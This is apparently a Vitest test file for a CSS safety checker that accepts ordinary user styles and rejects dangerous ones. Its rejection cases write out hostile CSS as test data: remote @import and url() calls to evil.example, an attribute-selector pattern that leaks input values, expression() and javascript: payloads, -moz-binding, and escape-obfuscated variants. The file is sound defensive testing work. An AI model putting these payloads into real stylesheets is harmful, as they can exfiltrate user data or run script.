import { describe, expect, it } from 'vitest';
import { checkCss, MAX_CSS_LENGTH } from '../../src/lib/css-safety';

describe('checkCss', () => {
  it('accepts ordinary CSS', () => {
    const result = checkCss(`
      ytd-rich-shelf-renderer[is-shorts] { display: none !important; }
      body { background: #111 !important; color: rgb(230 230 230); }
      .logo { background-image: url("data:image/svg+xml;utf8,<svg></svg>"); }
      .icon { mask: url(#mask-id); }
    `);
    expect(result).toEqual({ ok: true, problems: [] });
  });

  it.each([
    ['@import url("https://evil.example/x.css");', '@import'],
    ['input[value^="a"] { background: url(https://evil.example/a) }', 'Remote resource'],
    ["a { background: url('//evil.example/a') }", 'Remote resource'],
    ['a { background: url(  http://evil.example/a  ) }', 'Remote resource'],
    ['@font-face { font-family: X; src: url(https://fonts.example/x.woff2) }', 'Remote resource'],
    ['a { background: image-set("https://evil.example/a.png" 1x) }', 'image-set'],
    ['a { width: expression(alert(1)) }', 'expression'],
    ['a { background: url(javascript:alert(1)) }', 'javascript:'],
    ['a { -moz-binding: url(x.xml#y) }', '-moz-binding'],
  ])('rejects %s', (css, expected) => {
    const result = checkCss(css);
    expect(result.ok).toBe(false);
    expect(result.problems.join(' ')).toContain(expected);
  });

  it('sees through comments and escapes', () => {
    // Escapes resolve to the real function or at-rule name, as in the browser.
    expect(checkCss('a { background: \\75 rl(https://evil.example/a) }').ok).toBe(false);
    expect(checkCss('a { background: u\\rl(https://evil.example/a) }').ok).toBe(false);
    expect(checkCss('@\\69mport "x.css";').ok).toBe(false);
    // A comment splits a token in CSS, so these are harmless in the browser too.
    expect(checkCss('a { background: u/**/rl(https://evil.example) }').ok).toBe(true);
    expect(checkCss('@imp/* x */ort "x.css";').ok).toBe(true);
  });

  it('rejects oversized CSS', () => {
    expect(checkCss('a{}'.repeat(MAX_CSS_LENGTH)).ok).toBe(false);
  });
});
